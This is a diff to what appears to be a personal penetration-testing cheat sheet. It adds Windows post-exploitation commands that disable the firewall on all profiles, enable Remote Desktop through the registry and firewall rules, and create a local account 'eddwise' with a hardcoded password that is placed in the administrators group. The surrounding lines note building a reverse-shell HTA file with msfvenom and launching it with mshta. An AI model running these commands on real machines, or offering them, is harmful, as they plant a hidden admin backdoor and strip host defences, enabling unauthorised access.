@@ -10,9 +10,18 @@ Things that we should look for on a system:
     - Installed applications
     - Running processes
 
+Windows User Add in admins with RDP access
+
+    netsh advfirewall set allprofiles state off
+    reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+    netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+    net user eddwise Eddwise /add
+    net localgroup administrators eddwise /add
+
 rev shellwith hta file:
     msfvenom ..... -f hta-sch -o shell.hta
     mshta.exe
+
 Transfer File From Windows To Linux via ssh:
     1.on linux 2. on windows:
     
